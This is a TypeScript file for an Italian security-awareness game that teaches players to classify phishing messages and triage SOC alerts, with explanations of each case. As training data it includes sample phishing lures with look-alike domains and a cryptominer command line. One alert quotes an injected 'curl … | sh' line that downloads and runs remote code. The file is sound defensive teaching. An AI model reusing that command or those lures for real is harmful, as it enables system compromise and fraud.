// Mini giochi di classificazione: phishing e triage degli allarmi del SOC.

import type { Markup } from '../game/types';

/** Domanda di ragionamento dopo la scelta: quale indizio conta, cosa succede se... */
export interface Why {
  question: string;
  options: string[];
  correct: number;
  /** spiegazione se si sbaglia (facoltativa: altrimenti vale quella della carta) */
  explain?: Markup;
}

export interface Card {
  /** intestazione (mittente, sorgente dell'allarme...) */
  meta: [string, string][];
  title: string;
  body: string;
  /** indice della risposta giusta in Game.choices */
  answer: number;
  explain: Markup;
  /** missione dopo la quale la carta entra nel mazzo (tutto ciò che serve per capirla è stato spiegato) */
  after: string;
  /** perché: la domanda di ragionamento che segue la scelta */
  why: Why;
}

export interface Game {
  id: string;
  title: string;
  tagline: string;
  /** missione che sblocca il gioco */
  after: string;
  /** argomento registrato dal motore di apprendimento */
  topic: string;
  intro: Markup;
  choices: [string, string]; // [etichetta 0, etichetta 1]
  cards: Card[];
}

const PHISHING: Game = {
  id: 'phishing',
  after: 'chF-m3',
  topic: 'phishing',
  title: 'Phishing o no?',
  tagline: 'Email e messaggi: riconosci le truffe prima di cliccare.',
  intro: `Il **phishing** è il modo più comune con cui gli attaccanti entrano nelle aziende: un messaggio che finge di arrivare da qualcuno di fidato per farti cliccare un link, inserire una password o pagare.

Per ogni messaggio decidi se è **phishing** o **legittimo**. Guarda sempre:
- il **mittente** vero (il dominio dopo la @)
- dove porta davvero il **link**
- l'**urgenza** e la pressione ("entro 24 ore", "account bloccato")
- richieste insolite: password, codici, pagamenti, allegati inattesi`,
  choices: ['Phishing', 'Legittimo'],
  cards: [
    {
      meta: [['Da', 'Sicurezza Poste <avvisi@poste-italiane-verifica.com>'], ['Oggetto', 'Il tuo conto è stato sospeso']],
      title: 'Email',
      body: 'Gentile cliente, abbiamo rilevato attività sospette. Il conto verrà chiuso entro 24 ore se non confermi i tuoi dati.\n\nConferma ora: http://poste-italiane-verifica.com/login',
      answer: 0,
      explain: `**Phishing.** Il dominio \`poste-italiane-verifica.com\` non è quello ufficiale: chiunque può registrare un nome che "sembra" giusto. Più l'urgenza (24 ore) e la minaccia (chiusura del conto): i due segnali classici.`,
      after: 'chF-m3',
      why: { question: 'Quale indizio, da solo, basta a non fidarsi?', options: ['Il dominio del mittente non è quello ufficiale', 'Il messaggio inizia con "Gentile cliente"', 'Parla di attività sospette', 'È arrivato di mattina'], correct: 0 },
    },
    {
      meta: [['Da', 'GitHub <noreply@github.com>'], ['Oggetto', '[GitHub] A new SSH key was added to your account']],
      title: 'Email',
      body: 'The following SSH key was added to your account: "deck-laptop". If you believe this key was added in error, you can remove it at https://github.com/settings/keys',
      answer: 1,
      explain: `**Legittimo.** Dominio ufficiale, nessuna richiesta di dati, nessuna urgenza, e il link porta al sito vero. È una **notifica di sicurezza**: se la chiave non l'hai aggiunta tu, è proprio il momento di andare a controllare (aprendo il sito da solo, non per forza dal link).`,
      after: 'ch02-m3',
      why: { question: 'Cosa fai se la chiave "deck-laptop" NON l\'hai aggiunta tu?', options: ['La rimuovi dal sito vero, entrando da solo (non dal link), e cambi la password', 'Rispondi all\'email chiedendo spiegazioni', 'Ignori: è solo una notifica', 'Clicchi il link nell\'email e cancelli tutto'], correct: 0 },
    },
    {
      meta: [['Da', '+39 351 000 0000'], ['Tipo', 'SMS']],
      title: 'SMS',
      body: 'Ciao mamma, ho rotto il telefono e questo è il mio nuovo numero. Mi serve un favore urgente, puoi farmi un bonifico? Ti spiego dopo ❤️',
      answer: 0,
      explain: `**Phishing** (la truffa "ciao mamma"). Numero sconosciuto, una scusa per giustificarlo, urgenza e soldi. La difesa è semplice: **richiamare** il numero vecchio o verificare con un'altra persona prima di fare qualsiasi cosa.`,
      after: 'chF-m3',
      why: { question: 'Qual è la difesa più semplice ed efficace contro questa truffa?', options: ['Richiamare il numero vecchio, già conosciuto', 'Rispondere chiedendo come si chiama il cane', 'Fare il bonifico ma di una cifra piccola', 'Bloccare il numero e non dire niente a nessuno'], correct: 0 },
    },
    {
      meta: [['Da', 'Ufficio IT <it-support@scantinato-bar.it>'], ['Oggetto', 'Manutenzione programmata sabato']],
      title: 'Email',
      body: 'Ciao a tutti, sabato dalle 2 alle 4 il gestionale sarà offline per aggiornamenti. Non serve fare nulla. Per dubbi chiamate l\'interno 204. -- Jackie, IT',
      answer: 1,
      explain: `**Legittimo.** Dominio aziendale corretto, nessun link, nessuna richiesta, e un canale di verifica interno (l'interno telefonico). Un avviso informativo normale.`,
      after: 'chF-m3',
      why: { question: 'Perché un avviso senza link e con un interno telefonico è rassicurante?', options: ['Non chiede di fare niente e offre un canale di verifica che già conosci', 'Perché è scritto in italiano', 'Perché arriva di sabato', 'Perché è firmato con un nome'], correct: 0 },
    },
    {
      meta: [['Da', 'Microsoft 365 <no-reply@micros0ft-office.net>'], ['Oggetto', 'Hai 3 messaggi in attesa']],
      title: 'Email',
      body: 'La tua casella ha 3 messaggi bloccati. Accedi per rilasciarli.\n\n[ ACCEDI CON IL TUO ACCOUNT ]\n→ https://micros0ft-office.net/auth',
      answer: 0,
      explain: `**Phishing.** Guarda bene: \`micros0ft\` con lo **zero** al posto della o. Si chiama **typosquatting**. Lo scopo è farti inserire la password aziendale in una pagina finta, identica all'originale.`,
      after: 'chF-m3',
      why: { question: 'Cosa succede se inserisci la password su quella pagina?', options: ['Finisce all\'attaccante, che può entrare nella tua posta vera', 'Niente: la pagina non funziona', 'La password viene cambiata da Microsoft', 'Ricevi i 3 messaggi bloccati'], correct: 0 },
    },
    {
      meta: [['Da', 'Amministrazione <amministrazione@cliente-fornitore.it>'], ['Oggetto', 'R: fattura 2077/118 - NUOVO IBAN']],
      title: 'Email',
      body: 'Buongiorno, vi comunichiamo che da questo mese il nostro IBAN è cambiato. Vi preghiamo di effettuare il pagamento della fattura allegata sul nuovo conto. Grazie.',
      answer: 0,
      explain: `**Phishing**: è la frode del **cambio IBAN** (*Business Email Compromise*). A volte arriva perfino dalla casella vera del fornitore, perché è stata violata. Regola d'oro: un cambio di coordinate bancarie si verifica **sempre** per telefono, con un numero che avevi già, non con quello scritto nell'email.`,
      after: 'chF-m1',
      why: { question: 'Quale proprietà della triade CIA viene colpita da questa truffa?', options: ['Integrità: un dato (l\'IBAN) è stato cambiato', 'Disponibilità', 'Riservatezza', 'Nessuna'], correct: 0 },
    },
    {
      meta: [['Da', 'Banca <notifiche@tuabanca.it>'], ['Tipo', 'Notifica app']],
      title: 'Notifica',
      body: 'Hai effettuato un pagamento di 12,50 € presso NOODLE BAR WATSON. Se non riconosci l\'operazione, apri l\'app della banca.',
      answer: 1,
      explain: `**Legittimo.** Ti dice di aprire **l'app** (non un link), non chiede dati ed è coerente con quello che hai fatto. Le notifiche di pagamento sono utilissime per accorgersi presto di un uso fraudolento della carta.`,
      after: 'chF-m3',
      why: { question: 'Perché questa notifica è affidabile anche se parla di soldi?', options: ['Ti manda all\'app ufficiale, non a un link, e non chiede dati', 'Perché la cifra è piccola', 'Perché il bar esiste davvero', 'Perché ha l\'icona della banca'], correct: 0 },
    },
    {
      meta: [['Da', 'Corriere Espresso <info@consegne-pacchi.top>'], ['Tipo', 'SMS']],
      title: 'SMS',
      body: 'Il tuo pacco è fermo in deposito. Paga 1,99 € di spese di riconsegna: https://consegne-pacchi.top/p/88231',
      answer: 0,
      explain: `**Phishing** (*smishing*, phishing via SMS). La cifra piccola serve a farti abbassare la guardia: l'obiettivo vero sono i **dati della carta**. Se aspetti un pacco, controlla sul sito ufficiale del corriere scrivendo tu l'indirizzo.`,
      after: 'chF-m3',
      why: { question: 'Perché chiedono solo 1,99 €?', options: ['Una cifra piccola abbassa la guardia: il vero obiettivo sono i dati della carta', 'Perché è il prezzo vero della riconsegna', 'Per non farsi notare dalla banca', 'Per errore'], correct: 0 },
    },
    {
      meta: [['Da', 'Rook <rook@fixer.nc>'], ['Oggetto', 'urgente - codice']],
      title: 'Email',
      body: 'Choom ti ho appena mandato un codice di verifica per errore sul tuo telefono, me lo giri? Mi serve subito per entrare nel mio account.',
      answer: 0,
      explain: `**Phishing.** Anche se sembra un contatto conosciuto: i **codici di verifica** non si condividono **mai**, con nessuno. Chi te lo chiede sta cercando di entrare nel **tuo** account, e il codice è l'ultimo pezzo che gli manca. L'account di Rook potrebbe essere stato violato.`,
      after: 'chF-m4',
      why: { question: 'Cosa sta cercando di aggirare chi chiede il codice?', options: ['Il secondo fattore (MFA) del TUO account', 'L\'antivirus', 'Il firewall di Rook', 'La password di Rook'], correct: 0 },
    },
    {
      meta: [['Da', 'Nyx <nyx@netrunner.nc>'], ['Oggetto', 'Appunti per domani']],
      title: 'Email',
      body: 'Domani ripassiamo i permessi di Linux. Porta gli appunti del capitolo 03, niente di nuovo da installare. -- N.',
      answer: 1,
      explain: `**Legittimo.** Nessun link, nessun allegato, nessuna richiesta strana, tono coerente con chi lo manda. Non tutto è una minaccia: un buon analista non va in panico, valuta i segnali.`,
      after: 'chF-m3',
      why: { question: 'Perché è importante saper dire anche "legittimo"?', options: ['Un analista che vede minacce ovunque fa perdere tempo a tutti e rallenta il lavoro', 'Perché i messaggi di Nyx sono sempre sicuri', 'Perché il phishing non arriva mai da nomi conosciuti', 'Non è importante: meglio segnalare tutto'], correct: 0 },
    },
  ],
};

const SOC: Game = {
  id: 'soc',
  after: 'ch04-m3',
  topic: 'triage',
  title: 'Turno al SOC',
  tagline: 'Allarmi in arrivo: falso allarme o incidente vero?',
  intro: `Al SOC arrivano centinaia di allarmi al giorno, e la maggior parte sono **falsi positivi**: attività normali che assomigliano a un attacco. Il lavoro dell'analista è il **triage**: decidere in fretta e con criterio cosa ignorare e cosa **scalare** (*escalation*) agli incident responder.

Per ogni allarme scegli **Falso allarme** o **Escalation**. Considera il contesto: chi, da dove, a che ora, ed è normale per quell'utente?`,
  choices: ['Falso allarme', 'Escalation'],
  cards: [
    {
      meta: [['Regola', 'SSH: 5 login falliti in 2 minuti'], ['Sorgente', '192.168.1.12 → server'], ['Ora', '09:14']],
      title: 'Allarme',
      body: 'Utente: mama. 5 tentativi falliti, poi login riuscito dallo stesso IP. 192.168.1.12 è il telefono di Mama, sulla rete interna.',
      answer: 0,
      explain: `**Falso allarme.** IP interno conosciuto, orario di lavoro, pochi tentativi e poi successo: tipico di qualcuno che ha sbagliato a scrivere la password dopo averla cambiata. Da annotare, non da scalare.`,
      after: 'ch04-m2',
      why: { question: 'Quale dettaglio sposta di più verso il falso allarme?', options: ['IP interno conosciuto, orario di lavoro e poi successo', 'Che i tentativi siano 5', 'Che l\'utente si chiami mama', 'Che il server risponda'], correct: 0 },
    },
    {
      meta: [['Regola', 'SSH: 200 login falliti in 3 minuti'], ['Sorgente', '203.0.113.77 (estero) → server'], ['Ora', '03:14']],
      title: 'Allarme',
      body: 'Utenti tentati: root, admin, mama, test, oracle... Alle 03:17 un login RIUSCITO come mama dallo stesso IP.',
      answer: 1,
      explain: `**Escalation, subito.** Brute force da un IP esterno seguito da un **login riuscito**: non è più un tentativo, è un'intrusione probabile. È esattamente il caso che hai risolto nel capitolo 04.`,
      after: 'ch04-m3',
      why: { question: 'Qual è il primo passo dopo l\'escalation?', options: ['Contenere: bloccare l\'IP e chiudere la sessione, dopo aver messo al sicuro le prove', 'Cancellare auth.log', 'Spegnere il server senza dire niente', 'Aspettare il giorno dopo'], correct: 0 },
    },
    {
      meta: [['Regola', 'Antivirus: rilevato EICAR-Test-File'], ['Host', 'pc-jackie'], ['Ora', '11:02']],
      title: 'Allarme',
      body: 'File: C:\\Users\\jackie\\Downloads\\eicar.com. Ticket aperto ieri dall\'IT: "test dell\'antivirus su pc-jackie".',
      answer: 0,
      explain: `**Falso allarme** (anzi, un vero positivo innocuo). **EICAR** è un file di test standard, creato apposta per verificare che l'antivirus funzioni, e c'è un ticket che lo conferma. Controllare il contesto (il ticket) evita di perdere tempo.`,
      after: 'ch04-m3',
      why: { question: 'Cosa trasforma questo allarme in un falso allarme?', options: ['Il ticket dell\'IT che annuncia il test', 'Il nome del file', 'L\'ora', 'Che l\'antivirus l\'abbia rilevato'], correct: 0 },
    },
    {
      meta: [['Regola', 'Processo con CPU > 95% per 30 minuti'], ['Host', 'web-01'], ['Ora', '04:40']],
      title: 'Allarme',
      body: 'Processo: /tmp/.x/kworker -o pool.example:3333. Utente: www-data. Avviato alle 04:02.',
      answer: 1,
      explain: `**Escalation.** Processo in \`/tmp\` dentro una cartella nascosta, nome travestito da processo del kernel, gira come l'utente del server web e si collega a un "pool": è un **cryptominer**, e probabilmente qualcuno è entrato dal sito.`,
      after: 'ch04-m3',
      why: { question: 'Quale indizio, da solo, è già un indicatore di compromissione?', options: ['Un programma che parte da una cartella nascosta in /tmp', 'La CPU alta', 'L\'utente www-data', 'L\'orario notturno'], correct: 0 },
    },
    {
      meta: [['Regola', 'Scansione delle porte rilevata'], ['Sorgente', '192.168.1.50 → 192.168.1.0/24'], ['Ora', '21:05']],
      title: 'Allarme',
      body: 'nmap verso tutta la rete interna. 192.168.1.50 è il deck del consulente; contratto di penetration test firmato da Mama Reyes, valido per oggi.',
      answer: 0,
      explain: `**Falso allarme**: è la tua scansione del capitolo 02! Attività **autorizzata** e documentata. Per questo nei pentest veri si avvisa il SOC del cliente: così sa distinguere il test da un attacco.`,
      after: 'ch02-m3',
      why: { question: 'Perché nei pentest veri si avvisa il SOC del cliente?', options: ['Per distinguere il test autorizzato da un attacco vero', 'Per farsi pagare di più', 'Per spegnere il SOC durante il test', 'Non serve avvisarlo'], correct: 0 },
    },
    {
      meta: [['Regola', 'Nuovo utente con UID 0'], ['Host', 'clinica'], ['Ora', '22:44']],
      title: 'Allarme',
      body: 'Creato utente "sysupdate" con UID 0 tramite sudo da marco. Nessun ticket di modifica aperto.',
      answer: 1,
      explain: `**Escalation.** Un secondo utente con UID 0 è un secondo root. Senza una richiesta di modifica che lo giustifichi, è un classico segno di **persistenza** dopo un'intrusione (l'hai visto nell'operazione OP-02).`,
      after: 'ch03-m1',
      why: { question: 'Perché un secondo utente con UID 0 è così grave?', options: ['UID 0 è root: chi lo usa ha pieni poteri, qualunque nome abbia', 'Perché il nome sysupdate è sospetto', 'Perché è stato creato di sera', 'Perché marco non è root'], correct: 0 },
    },
    {
      meta: [['Regola', 'Login da paese insolito'], ['Utente', 'giulia@clinica'], ['Ora', '10:20']],
      title: 'Allarme',
      body: 'Login alla posta da Lisbona (PT). Calendario aziendale: Giulia è in ferie a Lisbona fino a venerdì. Accesso con MFA confermato dalla sua app.',
      answer: 0,
      explain: `**Falso allarme.** Il paese è insolito, ma il contesto lo spiega (ferie) e l'**MFA** è stato confermato dal suo telefono. Ecco perché l'MFA è così prezioso anche per il SOC: rende un login molto più affidabile.`,
      after: 'chF-m4',
      why: { question: 'Cosa rende questo login molto più credibile?', options: ['L\'MFA confermato dalla sua app, insieme alle ferie in calendario', 'Che Lisbona sia una bella città', 'L\'orario delle 10:20', 'Che usi la posta'], correct: 0 },
    },
    {
      meta: [['Regola', 'Molte richieste web con UNION SELECT'], ['Sorgente', '198.51.100.9 → jukebox.lan'], ['Ora', '20:15']],
      title: 'Allarme',
      body: '42 richieste a /playlist.php con UNION SELECT nei parametri. 3 risposte con codice 500, 1 risposta di 48 KB (le normali sono ~800 byte).',
      answer: 1,
      explain: `**Escalation.** Tentativi di SQL injection, e i segnali dicono che almeno uno potrebbe aver funzionato: errori 500 e una risposta enorme rispetto al solito, come nel capitolo 07. Può esserci stata un'esfiltrazione di dati.`,
      after: 'ch07-m3',
      why: { question: 'Quale segnale fa pensare che l\'attacco possa aver funzionato?', options: ['Una risposta molto più grande del normale (48 KB invece di ~800 byte)', 'Il numero di richieste', 'L\'orario serale', 'Il nome della pagina'], correct: 0 },
    },
    {
      meta: [['Regola', 'Molte richieste 404'], ['Sorgente', 'Googlebot (66.249.x.x) → radio.lan'], ['Ora', '06:00']],
      title: 'Allarme',
      body: '30 pagine non trovate, tutte vecchi indirizzi del sito precedente (/archivio-2075/...). User-Agent Googlebot, IP verificato di Google.',
      answer: 0,
      explain: `**Falso allarme.** È il motore di ricerca che ricontrolla vecchie pagine ancora nel suo indice. Nessun percorso "da attaccante" (/admin, /.env...), IP verificato. Si risolve con dei redirect, non con un incidente.`,
      after: 'ch07-m3',
      why: { question: 'Cosa avrebbe reso questo allarme preoccupante?', options: ['Richieste a percorsi da attaccante come /admin o /.env, da un IP non verificato', 'Più di 30 pagine non trovate', 'L\'orario delle 6', 'Il nome Googlebot'], correct: 0 },
    },
    {
      meta: [['Regola', 'File di sistema modificato (FIM)'], ['Host', 'jukebox'], ['Ora', '02:31']],
      title: 'Allarme',
      body: 'Modificato /opt/jukebox/update.sh: aggiunta la riga "curl -s http://203.0.113.77/x.sh | sh". Nessun aggiornamento programmato.',
      answer: 1,
      explain: `**Escalation.** Una riga che **scarica ed esegue** codice da un IP esterno, aggiunta a uno script di sistema senza motivo. È il firmware avvelenato del capitolo 06: il monitoraggio dell'integrità ha fatto il suo lavoro.`,
      after: 'ch06-m2',
      why: { question: 'Come si è accorto il sistema della modifica?', options: ['Il monitoraggio dell\'integrità ha visto cambiare l\'impronta del file', 'Lo ha detto l\'attaccante', 'Il file è diventato più lento', 'Per caso'], correct: 0 },
    },
  ],
};

export const GAMES: Game[] = [PHISHING, SOC];

// Domande sul perché riequilibrate (1.28): la risposta giusta non deve riconoscersi dalla lunghezza.
const WHY_FIX: Record<string, string[]> = {
  'Cosa fai se la chiave "deck-laptop" NON l\'hai aggiunta tu?': ['La tolgo dal sito vero, entrando da solo', 'Rispondo all\'email chiedendo spiegazioni', 'Clicco il link dell\'email e la cancello', 'Ignoro: è solo una notifica automatica'],
  'Perché un avviso senza link e con un interno telefonico è rassicurante?': ['Non chiede niente e si può verificare', 'È scritto in un italiano corretto', 'Arriva di sabato, a ufficio chiuso', 'È firmato con nome e cognome'],
  'Cosa succede se inserisci la password su quella pagina?': ['La riceve l\'attaccante, per la posta vera', 'Niente: la pagina finta non funziona', 'Microsoft cambia subito la password', 'Ricevi i tre messaggi bloccati'],
  'Quale proprietà della triade CIA viene colpita da questa truffa?': ['Integrità', 'Disponibilità', 'Riservatezza', 'Nessuna delle tre'],
  'Perché questa notifica è affidabile anche se parla di soldi?': ['Ti manda all\'app, non chiede dati', 'La cifra del pagamento è piccola', 'Il bar indicato esiste davvero', 'Ha il logo ufficiale della banca'],
  'Perché chiedono solo 1,99 €?': ['Per avere i dati della carta', 'È il prezzo vero del servizio', 'Per non farsi notare dalla banca', 'Per un errore del corriere'],
  'Cosa sta cercando di aggirare chi chiede il codice?': ['Il secondo fattore del TUO account', 'L\'antivirus del tuo telefono', 'Il firewall della rete di Rook', 'La password dell\'account di Rook'],
  'Perché è importante saper dire anche "legittimo"?': ['Vedere minacce ovunque fa perdere tempo', 'I messaggi di Nyx sono sempre sicuri', 'Il phishing non usa nomi conosciuti', 'Non lo è: meglio segnalare tutto'],
  'Quale dettaglio sposta di più verso il falso allarme?': ['IP interno, orario d\'ufficio, poi successo', 'Che i tentativi siano esattamente 5', 'Che l\'utente si chiami proprio mama', 'Che il server continui a rispondere'],
  'Qual è il primo passo dopo l\'escalation?': ['Prove al sicuro, poi contenere', 'Cancellare auth.log e riavviare', 'Spegnere il server in silenzio', 'Aspettare il turno del giorno dopo'],
  'Quale indizio, da solo, è già un indicatore di compromissione?': ['Parte da una cartella nascosta in /tmp', 'La CPU è vicina al cento per cento', 'Gira con l\'utente www-data', 'È partito in piena notte'],
  'Perché nei pentest veri si avvisa il SOC del cliente?': ['Per distinguere il test da un attacco', 'Per farsi pagare qualche ora in più', 'Per spegnere il SOC durante il test', 'Non serve: il SOC non se ne accorge'],
  'Perché un secondo utente con UID 0 è così grave?': ['UID 0 è root, qualunque nome abbia', 'Il nome sysupdate è sospetto', 'È stato creato di sera tardi', 'Marco non è un amministratore'],
  'Cosa rende questo login molto più credibile?': ['MFA confermato e ferie in calendario', 'Lisbona è una città molto turistica', 'L\'orario delle 10:20, in pieno giorno', 'Che l\'accesso sia alla sola posta'],
  'Quale segnale fa pensare che l\'attacco possa aver funzionato?': ['Una risposta di 48 KB invece di 800 byte', 'Il numero totale di richieste fatte', 'L\'orario serale delle richieste', 'Il nome della pagina presa di mira'],
  'Cosa avrebbe reso questo allarme preoccupante?': ['Percorsi da attaccante, da IP non verificato', 'Più di trenta pagine non trovate', 'L\'orario delle sei del mattino', 'Il nome Googlebot nell\'intestazione'],
  'Come si è accorto il sistema della modifica?': ['È cambiata l\'impronta del file', 'Lo ha segnalato l\'attaccante', 'Il file è diventato più lento', 'Per caso, durante un backup'],
};
for (const g of GAMES)
  for (const c of g.cards) {
    const f = WHY_FIX[c.why.question];
    if (f) c.why = { ...c.why, options: f, correct: 0 };
  }


// ---------------------------------------------------------------- casi generati
//
// Oltre ai casi scritti a mano, ogni partita ne riceve alcuni costruiti da modelli con dati
// sempre diversi (mittenti, domini, indirizzi, orari): così i casi non si imparano a memoria,
// si impara a riconoscere i segnali.

type R = { pick<T>(a: readonly T[]): T; int(a: number, b: number): number; next(): number };

const BRANDS: [string, string][] = [
  ['Banca Neon', 'bancaneon.nc'],
  ['Corriere Sprint', 'corrieresprint.nc'],
  ['NetFlux', 'netflux.nc'],
  ['Comune di Night City', 'comune.nightcity.nc'],
  ['Arasaka Pay', 'arasakapay.nc'],
];

function fakeDomain(r: R, real: string): string {
  const [name, ...rest] = real.split('.');
  const tld = rest.join('.');
  return r.pick([
    `${name.replace('o', '0')}.${tld}`,
    `${name}-verifica.${tld}`,
    `${name}.top`,
    `${name}-sicurezza.com`,
    `secure-${name}.${tld}`,
  ]);
}

/** Un caso di phishing o legittimo, costruito a caso. */
export function generatePhishingCard(r: R): Card {
  const [brand, real] = r.pick(BRANDS);
  const kind = r.int(0, 3);
  if (kind === 0) {
    const fake = fakeDomain(r, real);
    return {
      meta: [['Da', `${brand} <avvisi@${fake}>`], ['Oggetto', r.pick(['Azione richiesta entro oggi', 'Il tuo account sarà sospeso', 'Verifica i tuoi dati'])]],
      title: 'Email',
      body: `Gentile cliente, abbiamo rilevato un accesso insolito. Per evitare la sospensione entro ${r.int(2, 24)} ore conferma i tuoi dati qui: https://${fake}/login`,
      answer: 0,
      explain: `**Phishing.** Il dominio \`${fake}\` non è \`${real}\`: basta un carattere o una parola in più. Urgenza e minaccia completano il quadro.`,
      after: 'chF-m3',
      why: { question: 'Quale indizio basta da solo?', options: [`Il dominio non è ${real}`, 'Il tono è molto cortese e formale', 'Parla di un accesso insolito', 'È arrivato in orario d\'ufficio'], correct: 0 },
    };
  }
  if (kind === 1) {
    const fake = fakeDomain(r, real);
    return {
      meta: [['Da', `${brand} <info@${real}>`], ['Oggetto', 'Aggiornamento importante']],
      title: 'Email',
      body: `Il mittente sembra quello vero. Il testo dice: "Clicca su ${real}/area-clienti". Passando il dito sul link, l'indirizzo vero è https://${fake}/area-clienti`,
      answer: 0,
      explain: `**Phishing.** Il testo del link e la destinazione vera sono diversi: conta sempre la destinazione (\`${fake}\`). Il mittente si può falsificare, o la casella vera può essere stata violata.`,
      after: 'chF-m3',
      why: { question: 'Cosa conta davvero, in un link?', options: ['Dove porta davvero, non il testo che mostra', 'Il colore del pulsante', 'Che il mittente abbia un nome conosciuto', 'Che il testo sia scritto bene'], correct: 0 },
    };
  }
  if (kind === 2) {
    return {
      meta: [['Da', `${brand} <notifiche@${real}>`], ['Tipo', 'Notifica']],
      title: 'Notifica',
      body: `Hai effettuato un accesso dal nuovo dispositivo "${r.pick(['telefono di casa', 'portatile', 'tablet'])}" alle ${String(r.int(8, 21)).padStart(2, '0')}:${String(r.int(0, 59)).padStart(2, '0')}. Se non sei stato tu, apri l'app ufficiale e cambia la password.`,
      answer: 1,
      explain: '**Legittimo.** Dominio ufficiale, nessun link, nessuna richiesta di dati: ti dice di usare l\'app. È una notifica di sicurezza utile.',
      after: 'chF-m3',
      why: { question: 'Perché è affidabile?', options: ['Nessun link, nessun dato richiesto', 'Usa il tuo nome e cognome', 'È breve e scritta bene', 'Arriva in pieno giorno'], correct: 0 },
    };
  }
  const amount = `${r.int(1, 9)},${r.int(10, 99)} €`;
  return {
    meta: [['Da', `+39 3${r.int(10, 99)} ${r.int(100, 999)} ${r.int(1000, 9999)}`], ['Tipo', 'SMS']],
    title: 'SMS',
    body: `${brand}: il tuo pacco è in giacenza. Paga ${amount} di spese per la riconsegna: https://${fakeDomain(r, real)}/p/${r.int(10000, 99999)}`,
    answer: 0,
    explain: `**Phishing** via SMS (*smishing*). La cifra piccola (${amount}) serve a farti abbassare la guardia: l'obiettivo sono i dati della carta.`,
    after: 'chF-m3',
    why: { question: 'Cosa cerca davvero chi lo manda?', options: ['I dati della carta di credito', `I ${amount}`, 'Il tuo indirizzo di casa', 'Niente: è un errore'], correct: 0 },
  };
}

const IP = (r: R) => `${r.pick(['198.51.100', '203.0.113', '192.0.2'])}.${r.int(2, 250)}`;
const HH = (r: R, a: number, b: number) => `${String(r.int(a, b)).padStart(2, '0')}:${String(r.int(0, 59)).padStart(2, '0')}`;
const PEOPLE = ['anna', 'bruno', 'carla', 'dario', 'elena', 'fabio', 'gina', 'luca', 'marta', 'nico'];

/** Un allarme da smistare, costruito a caso. */
export function generateTriageCard(r: R): Card {
  const who = r.pick(PEOPLE);
  const kind = r.int(0, 4);
  if (kind === 0) {
    const ip = IP(r);
    const n = r.int(80, 400);
    return {
      meta: [['Regola', `SSH: ${n} login falliti in ${r.int(2, 6)} minuti`], ['Sorgente', `${ip} → server`], ['Ora', HH(r, 1, 4)]],
      title: 'Allarme',
      body: `Utenti tentati: root, admin, ${who}... Poco dopo, un login RIUSCITO come ${who} dallo stesso indirizzo.`,
      answer: 1,
      explain: '**Escalation, subito.** Tentativi in massa da fuori seguiti da un accesso riuscito: è un\'intrusione probabile.',
      after: 'ch04-m3',
      why: { question: 'Quale dettaglio rende urgente questo allarme?', options: ['Il login riuscito alla fine', 'Il numero esatto dei tentativi', 'Il nome dell\'utente provato', 'L\'orario notturno dei tentativi'], correct: 0 },
    };
  }
  if (kind === 1) {
    return {
      meta: [['Regola', `SSH: ${r.int(3, 6)} login falliti in 2 minuti`], ['Sorgente', `192.168.1.${r.int(10, 60)} → server`], ['Ora', HH(r, 8, 18)]],
      title: 'Allarme',
      body: `Utente: ${who}. Pochi tentativi falliti, poi login riuscito dallo stesso indirizzo interno, in orario d'ufficio. Ieri ${who} ha cambiato password.`,
      answer: 0,
      explain: '**Falso allarme.** Rete interna, orario di lavoro, pochi errori e una password appena cambiata: qualcuno ha sbagliato a scriverla.',
      after: 'ch04-m3',
      why: { question: 'Cosa spiega i tentativi falliti?', options: ['La password cambiata il giorno prima', 'Un attacco dalla rete interna', 'Un guasto del server', 'Un virus'], correct: 0 },
    };
  }
  if (kind === 2) {
    const path = `/tmp/.${r.pick(['x', 'cache', 'sys', 'font'])}/${r.pick(['kworker', 'dbus-sync', 'systemd-helper'])}`;
    return {
      meta: [['Regola', 'Processo con CPU > 90% per 30 minuti'], ['Host', `web-0${r.int(1, 9)}`], ['Ora', HH(r, 0, 5)]],
      title: 'Allarme',
      body: `Processo: ${path}. Utente: www-data. Si collega a un indirizzo esterno sulla porta ${r.pick([3333, 4444, 8333])}.`,
      answer: 1,
      explain: '**Escalation.** Un programma da una cartella nascosta in /tmp, con il nome di un processo di sistema, che parla con l\'esterno: indicatore di compromissione da manuale.',
      after: 'ch04-m3',
      why: { question: 'Quale indizio, da solo, è già sospetto?', options: ['Parte da una cartella nascosta', 'Gira con l\'utente www-data', 'Usa molta CPU da mezz\'ora', 'È attivo in piena notte'], correct: 0 },
    };
  }
  if (kind === 3) {
    const city = r.pick(['Lisbona', 'Berlino', 'Tokyo', 'Atene']);
    return {
      meta: [['Regola', 'Login da paese insolito'], ['Utente', `${who}@azienda`], ['Ora', HH(r, 9, 19)]],
      title: 'Allarme',
      body: `Accesso alla posta da ${city}. Il calendario aziendale dice che ${who} è in trasferta a ${city} questa settimana. Secondo fattore (MFA) confermato dal suo telefono.`,
      answer: 0,
      explain: '**Falso allarme.** Il paese è insolito, ma il contesto lo spiega e l\'MFA è stato confermato dal telefono di chi viaggia.',
      after: 'chF-m4',
      why: { question: 'Cosa rende credibile questo accesso?', options: ['Trasferta e MFA confermato', 'È in orario di lavoro', 'Riguarda solo la posta', 'La città è molto nota'], correct: 0 },
    };
  }
  const city = r.pick(['un paese mai visto', 'un indirizzo di un servizio di anonimato', 'un centro dati estero']);
  return {
    meta: [['Regola', 'Login da paese insolito'], ['Utente', `direzione@azienda`], ['Ora', HH(r, 1, 4)]],
    title: 'Allarme',
    body: `Accesso riuscito all'account del direttore da ${city}, alle tre di notte. L'account non ha il secondo fattore. Nessuna trasferta in calendario.`,
    answer: 1,
    explain: '**Escalation.** Account importante, orario strano, provenienza mai vista e niente MFA: si scala subito, con una nota chiara.',
    after: 'chF-m4',
    why: { question: 'Cosa manca, che avrebbe potuto fermarlo?', options: ['Il secondo fattore (MFA)', 'Un antivirus', 'Un firewall sul telefono', 'Una password più corta'], correct: 0 },
  };
}
